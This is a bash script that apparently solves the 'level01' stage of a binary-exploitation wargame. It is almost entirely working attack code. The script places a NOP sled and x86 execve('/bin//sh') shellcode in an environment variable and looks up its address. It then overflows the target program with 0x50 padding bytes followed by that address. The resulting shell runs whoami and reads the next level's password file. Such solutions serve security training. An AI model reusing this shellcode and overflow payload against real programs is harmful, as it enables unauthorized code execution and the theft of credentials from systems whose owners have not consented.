#!/bin/bash

function buildExploit {
    NOPSLED="'\x90' * 0xff"
    SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    export SHELLCODE=`python -c "print $NOPSLED + '$SHELLCODE'"`

    SH_BIGENDIAN_ADDR=`/tmp/getenv32 SHELLCODE ~/level01`
    SH_LILENDIAN_ADDR=`python -c "import struct; print struct.pack('<L', int('$SH_BIGENDIAN_ADDR', 16))"`

    python -c "print 'dat_wil\n' + 'A' * 0x50 + '$SH_LILENDIAN_ADDR'" > /tmp/exploit01
}

set -x
(buildExploit; cat /tmp/exploit01 - | ~/level01) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/users/level02/.pass)"
EOI